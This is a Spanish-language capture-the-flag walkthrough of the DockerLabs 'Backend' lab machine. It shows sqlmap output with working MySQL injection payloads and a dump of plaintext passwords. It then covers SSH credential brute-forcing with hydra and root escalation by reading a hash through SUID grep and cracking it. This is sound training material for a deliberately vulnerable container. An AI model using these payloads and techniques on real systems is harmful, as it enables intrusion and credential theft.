---
icon: flag
---

# Backend DockerLabs (Easy)

### Instalación

Cuando obtenemos el `.zip` nos lo pasamos al entorno en el que vamos a empezar a hackear la maquina y haremos lo siguiente.

```shell
unzip backend.zip
```

Nos lo descomprimira y despues montamos la maquina de la siguiente forma.

```shell
bash auto_deploy.sh backend.tar
```

Info:

```
                            ##        .         
                      ## ## ##       ==         
                   ## ## ## ##      ===         
               /""""""""""""""""\___/ ===       
          ~~~ {~~ ~~~~ ~~~ ~~~~ ~~ ~ /  ===- ~~~
               \______ o          __/           
                 \    \        __/            
                  \____\______/               
                                          
  ___  ____ ____ _  _ ____ ____ _    ____ ___  ____   
  |  \ |  | |    |_/  |___ |__/ |    |__| |__] [__   
  |__/ |__| |___ | \_ |___ |  \ |___ |  | |__] ___]  
                                         
                                     

Estamos desplegando la máquina vulnerable, espere un momento.

Máquina desplegada, su dirección IP es --> 172.17.0.2

Presiona Ctrl+C cuando termines con la máquina para eliminarla
```

Por lo que cuando terminemos de hackearla, le damos a `Ctrl+C` y nos eliminara la maquina para que no se queden archivos basura.

### Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-01-10 05:37 EST
Nmap scan report for spainmerides.dl (172.17.0.2)
Host is up (0.000038s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u3 (protocol 2.0)
| ssh-hostkey: 
|   256 08:ba:95:95:10:20:1e:54:19:c3:33:a8:75:dd:f8:4d (ECDSA)
|_  256 1e:22:63:40:c9:b9:c5:6f:c2:09:29:84:6f:e7:0b:76 (ED25519)
80/tcp open  http    Apache httpd 2.4.61 ((Debian))
|_http-server-header: Apache/2.4.61 (Debian)
|_http-title: test page
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.78 seconds
```

Si nos vamos a la pagina veremos un login, que estara en la siguiente direccion:

```
URL = http://<IP>/login.html
```

Si probamos a realizar un `SQLInjection` con un `request` de la siguiente forma:

Primero capturaremos la peticion del login con `BurpSuite`, por lo que pondremos lo que sea en mi caso `admin:admin` y le daremos a `login` mientras esta `BurpSuit` escuchando, esto nos capturara la peticion y veremos algo asi:

> request.txt

```
POST /login.php HTTP/1.1
Host: 172.17.0.2
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://172.17.0.2
Connection: keep-alive
Referer: http://172.17.0.2/login.html
Upgrade-Insecure-Requests: 1
Priority: u=0, i

username=admin&password=admin
```

## sqlmap

Por lo que volcaremos toda la base de datos para ver que hay si funcionara:

```shell
sqlmap -r request.txt --dbs
```

Info:

```
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.8.11#stable}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:41:02 /2025-01-10/

[05:41:02] [INFO] parsing HTTP request from 'request.txt'
[05:41:02] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/logerror.html'. Do you want to follow? [Y/n] y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] 

[05:41:06] [INFO] checking if the target is protected by some kind of WAF/IPS
[05:41:06] [INFO] testing if the target URL content is stable
[05:41:06] [WARNING] POST parameter 'username' does not appear to be dynamic
[05:41:06] [INFO] heuristic (basic) test shows that POST parameter 'username' might be injectable (possible DBMS: 'MySQL')
[05:41:06] [INFO] testing for SQL injection on POST parameter 'username'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] 

for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] 

[05:41:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[05:41:08] [WARNING] reflective value(s) found and filtering out
[05:41:08] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[05:41:08] [INFO] testing 'Generic inline queries'
[05:41:08] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:41:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[05:41:09] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[05:41:09] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[05:41:09] [INFO] POST parameter 'username' appears to be 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause' injectable 
[05:41:09] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[05:41:09] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[05:41:09] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[05:41:09] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[05:41:09] [INFO] testing 'MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)'
[05:41:09] [INFO] testing 'MySQL >= 5.6 OR error-based - WHERE or HAVING clause (GTID_SUBSET)'
[05:41:09] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[05:41:09] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[05:41:09] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[05:41:09] [INFO] POST parameter 'username' is 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)' injectable 
[05:41:09] [INFO] testing 'MySQL inline queries'
[05:41:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (comment)'
[05:41:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries'
[05:41:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP - comment)'
[05:41:09] [INFO] testing 'MySQL >= 5.0.12 stacked queries (query SLEEP)'
[05:41:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK - comment)'
[05:41:09] [INFO] testing 'MySQL < 5.0.12 stacked queries (BENCHMARK)'
[05:41:09] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[05:41:19] [INFO] POST parameter 'username' appears to be 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)' injectable 
[05:41:19] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[05:41:19] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
[05:41:19] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[05:41:19] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[05:41:19] [INFO] target URL appears to have 3 columns in query
do you want to (re)try to find proper UNION column types with fuzzy test? [y/N] 

injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 

[05:41:22] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[05:41:22] [INFO] target URL appears to be UNION injectable with 3 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] 

[05:41:24] [INFO] testing 'MySQL UNION query (40) - 21 to 40 columns'
[05:41:24] [INFO] testing 'MySQL UNION query (20) - 41 to 60 columns'
[05:41:24] [INFO] testing 'MySQL UNION query (20) - 61 to 80 columns'
[05:41:24] [INFO] testing 'MySQL UNION query (20) - 81 to 100 columns'
POST parameter 'username' is vulnerable. Do you want to keep testing the others (if any)? [y/N] 

sqlmap identified the following injection point(s) with a total of 318 HTTP(s) requests:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=admin' RLIKE (SELECT (CASE WHEN (8933=8933) THEN 0x61646d696e ELSE 0x28 END))-- AJzr&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 7445 FROM(SELECT COUNT(*),CONCAT(0x717a787a71,(SELECT (ELT(7445=7445,1))),0x716b786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IIJH&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 5315 FROM (SELECT(SLEEP(5)))gRbi)-- HTBl&password=admin
---
[05:41:25] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[05:41:25] [INFO] fetching database names
[05:41:25] [INFO] retrieved: 'information_schema'
[05:41:25] [INFO] retrieved: 'performance_schema'
[05:41:25] [INFO] retrieved: 'sys'
[05:41:25] [INFO] retrieved: 'mysql'
[05:41:25] [INFO] retrieved: 'users'
available databases [5]:
[*] information_schema
[*] mysql
[*] performance_schema
[*] sys
[*] users

[05:41:25] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 05:41:25 /2025-01-10/
```

Vemos que efectivamente nos volco la base de datos y entre ellas hay una muy interesante llamada `users`, por lo que haremos lo siguiente:

```shell
sqlmap -r request.txt --batch -D users --threads 10 --tables
```

Info:

```
        ___
       __H__
 ___ ___["]_____ ___ ___  {1.8.11#stable}
|_ -| . [.]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:44:37 /2025-01-10/

[05:44:37] [INFO] parsing HTTP request from 'request.txt'
[05:44:37] [INFO] resuming back-end DBMS 'mysql' 
[05:44:37] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/logerror.html'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=admin' RLIKE (SELECT (CASE WHEN (8933=8933) THEN 0x61646d696e ELSE 0x28 END))-- AJzr&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 7445 FROM(SELECT COUNT(*),CONCAT(0x717a787a71,(SELECT (ELT(7445=7445,1))),0x716b786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IIJH&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 5315 FROM (SELECT(SLEEP(5)))gRbi)-- HTBl&password=admin
---
[05:44:37] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[05:44:37] [INFO] fetching tables for database: 'users'
[05:44:37] [INFO] retrieved: 'usuarios'
Database: users
[1 table]
+----------+
| usuarios |
+----------+

[05:44:37] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 05:44:37 /2025-01-10/
```

Vemos que hay una tabla llamada `usuarios`:

```shell
sqlmap -r request.txt --batch -D users -T usuarios --threads 10 --columns
```

Info:

```
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.11#stable}
|_ -| . [)]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:45:42 /2025-01-10/

[05:45:42] [INFO] parsing HTTP request from 'request.txt'
[05:45:42] [INFO] resuming back-end DBMS 'mysql' 
[05:45:42] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/logerror.html'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=admin' RLIKE (SELECT (CASE WHEN (8933=8933) THEN 0x61646d696e ELSE 0x28 END))-- AJzr&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 7445 FROM(SELECT COUNT(*),CONCAT(0x717a787a71,(SELECT (ELT(7445=7445,1))),0x716b786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IIJH&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 5315 FROM (SELECT(SLEEP(5)))gRbi)-- HTBl&password=admin
---
[05:45:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[05:45:42] [INFO] fetching columns for table 'usuarios' in database 'users'
[05:45:42] [INFO] starting 3 threads
[05:45:42] [INFO] retrieved: 'id'
[05:45:42] [INFO] retrieved: 'password'
[05:45:42] [INFO] retrieved: 'username'
[05:45:42] [INFO] retrieved: 'int(11)'
[05:45:43] [INFO] retrieved: 'varchar(255)'
[05:45:43] [INFO] retrieved: 'varchar(255)'
Database: users
Table: usuarios
[3 columns]
+----------+--------------+
| Column   | Type         |
+----------+--------------+
| id       | int(11)      |
| password | varchar(255) |
| username | varchar(255) |
+----------+--------------+

[05:45:43] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 05:45:43 /2025-01-10/
```

Por lo que vemos hay varias columnas interesantes, por lo que veremos la informacion de cada una de ellas:

```shell
sqlmap -r request.txt --batch -D users -T usuarios --threads 10 --dump
```

Info:

```
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.8.11#stable}
|_ -| . [(]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 05:46:42 /2025-01-10/

[05:46:42] [INFO] parsing HTTP request from 'request.txt'
[05:46:42] [INFO] resuming back-end DBMS 'mysql' 
[05:46:42] [INFO] testing connection to the target URL
got a 302 redirect to 'http://172.17.0.2/logerror.html'. Do you want to follow? [Y/n] Y
redirect is a result of a POST request. Do you want to resend original POST data to a new location? [Y/n] Y
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=admin' RLIKE (SELECT (CASE WHEN (8933=8933) THEN 0x61646d696e ELSE 0x28 END))-- AJzr&password=admin

    Type: error-based
    Title: MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)
    Payload: username=admin' AND (SELECT 7445 FROM(SELECT COUNT(*),CONCAT(0x717a787a71,(SELECT (ELT(7445=7445,1))),0x716b786271,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.PLUGINS GROUP BY x)a)-- IIJH&password=admin

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=admin' AND (SELECT 5315 FROM (SELECT(SLEEP(5)))gRbi)-- HTBl&password=admin
---
[05:46:42] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Debian
web application technology: Apache 2.4.61
back-end DBMS: MySQL >= 5.0 (MariaDB fork)
[05:46:42] [INFO] fetching columns for table 'usuarios' in database 'users'
[05:46:42] [INFO] starting 3 threads
[05:46:42] [INFO] resumed: 'id'
[05:46:42] [INFO] resumed: 'int(11)'
[05:46:42] [INFO] resumed: 'username'
[05:46:42] [INFO] resumed: 'varchar(255)'
[05:46:42] [INFO] resumed: 'password'
[05:46:42] [INFO] resumed: 'varchar(255)'
[05:46:42] [INFO] fetching entries for table 'usuarios' in database 'users'
[05:46:42] [INFO] starting 3 threads
[05:46:42] [INFO] retrieved: '1'
[05:46:42] [INFO] retrieved: '3'
[05:46:42] [INFO] retrieved: '2'
[05:46:42] [INFO] retrieved: '$paco$123'
[05:46:42] [INFO] retrieved: 'jjuuaann123'
[05:46:42] [INFO] retrieved: 'paco'
[05:46:42] [INFO] retrieved: 'P123pepe3456P'
[05:46:42] [INFO] retrieved: 'juan'
[05:46:42] [INFO] retrieved: 'pepe'
Database: users
Table: usuarios
[3 entries]
+----+---------------+----------+
| id | password      | username |
+----+---------------+----------+
| 1  | $paco$123     | paco     |
| 2  | P123pepe3456P | pepe     |
| 3  | jjuuaann123   | juan     |
+----+---------------+----------+

[05:46:42] [INFO] table 'users.usuarios' dumped to CSV file '/root/.local/share/sqlmap/output/172.17.0.2/dump/users/usuarios.csv'
[05:46:42] [INFO] fetched data logged to text files under '/root/.local/share/sqlmap/output/172.17.0.2'

[*] ending @ 05:46:42 /2025-01-10/
```

## Escalate user pepe

### Hydra

Vemos que pudimos obtener las credenciales de 3 usuarios, por lo que probaremos fuerza bruta por `SSH` creando un diccionario de cada uno de los usuarios y contraseñas:

> users.txt

```
paco
pepe
juan
```

> pass.txt

```
$paco$123
P123pepe3456P
jjuuaann123
```

Y lanzaremos un `hydra`:

```shell
hydra -L users.txt -P pass.txt ssh://<IP> -t 64
```

Info:

```
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-01-10 05:47:57
[WARNING] Many SSH configurations limit the number of parallel tasks, it is recommended to reduce the tasks: use -t 4
[DATA] max 9 tasks per 1 server, overall 9 tasks, 9 login tries (l:3/p:3), ~1 try per task
[DATA] attacking ssh://172.17.0.2:22/
[22][ssh] host: 172.17.0.2   login: pepe   password: P123pepe3456P
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-01-10 05:48:02
```

Por lo que vemos obtuvimos las credenciales del usuario `pepe`, por lo que nos conectaremos con dichas credenciales.

### SSH

```shell
ssh pepe@<IP>
```

Metemos como contraseña `P123pepe3456P` y veremos que estamos dentro.

## Escalate Privileges

Si listamos los permisos `SUID` que tenemos, veremos lo siguiente:

```shell
find / -type f -perm -4000 -ls 2>/dev/null
```

Info:

```
2105550    640 -rwsr-xr-x   1 root     root       653888 Jun 22  2024 /usr/lib/openssh/ssh-keysign
  2105494     52 -rwsr-xr--   1 root     messagebus    51272 Sep 16  2023 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
  2118846    148 -rwsr-xr-x   1 root     root         151344 Sep 20  2022 /usr/bin/ls
  2097793     52 -rwsr-xr-x   1 root     root          52880 Mar 23  2023 /usr/bin/chsh
  2097917     48 -rwsr-xr-x   1 root     root          48896 Mar 23  2023 /usr/bin/newgrp
  2097928     68 -rwsr-xr-x   1 root     root          68248 Mar 23  2023 /usr/bin/passwd
  2097980     72 -rwsr-xr-x   1 root     root          72000 Mar 28  2024 /usr/bin/su
  2097854     88 -rwsr-xr-x   1 root     root          88496 Mar 23  2023 /usr/bin/gpasswd
  2097912     60 -rwsr-xr-x   1 root     root          59704 Mar 28  2024 /usr/bin/mount
  2098004     36 -rwsr-xr-x   1 root     root          35128 Mar 28  2024 /usr/bin/umount
  2097787     64 -rwsr-xr-x   1 root     root          62672 Mar 23  2023 /usr/bin/chfn
  2118862    200 -rwsr-xr-x   1 root     root         203152 Jan 24  2023 /usr/bin/grep
```

Vemos 2 bastante interesantes llamados `grep` y `ls`, por lo que si lo ejecutamos lo ejecutaremos como el usuario `root`.

Si hacemos esto:

```shell
ls -la /root/
```

Info:

```
total 24
drwx------ 1 root root 4096 Aug 27 15:15 .
drwxr-xr-x 1 root root 4096 Jan 10 10:37 ..
-rw-r--r-- 1 root root  571 Apr 10  2021 .bashrc
-rw-r--r-- 1 root root  161 Jul  9  2019 .profile
drwx------ 2 root root 4096 Aug 27 15:08 .ssh
-rw-r--r-- 1 root root   33 Aug 27 15:15 pass.hash
```

Vemos que hay un archivo interesante llamado `pass.hash` que podremos leer de la siguiente forma:

```shell
LFILE=/root/pass.hash
grep '' $LFILE
```

Info:

```
e43833c4c9d5ac444e16bb94715a75e4
```

Por lo que vemos hay una contraseña codificada en `MD5` que si lo decodificamos veremos lo siguiente:

```
spongebob34
```

Por lo que la utilizaremos para ser `root`.

```shell
su root
```

Metemos como contraseña `spongebob34` y veremos que somos `root`.
